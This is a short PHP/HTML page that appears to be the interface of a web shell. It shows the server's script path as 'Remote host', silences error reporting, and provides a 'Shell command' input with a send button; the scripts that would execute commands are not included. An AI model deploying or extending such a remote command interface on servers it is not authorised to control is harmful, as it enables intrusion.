<?php
//ini_set('max_execution_time', 3000); // default value
error_reporting(E_ALL);  //development
error_reporting(0);  //production
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
    <link rel="stylesheet" href="src/style.css" type="text/css">
</head>

<body>
<div class="container">
    <p></p>

    <div class="row">
        <div id="result" class="col-xs-12">
            <table cellpadding="4" cellspacing="1">
                <tr><th>Remote host: <?php echo $_SERVER['SCRIPT_FILENAME'] ?> </th></tr>
                <tr><td id="result"> </td></tr>
            </table>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <form action="javascript:void('interception auto-post')">
                <div class="form-group">
                    <label for="time">Shell command: </label>
                    <input type="text" class="form-control" name="command">
                </div>
                <hr>
                <button id="submit" class="btn btn-success">Send command</button>
            </form>
            <!-- end form -->
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script src="js/script.js"></script>
</div>
</body>

</html>

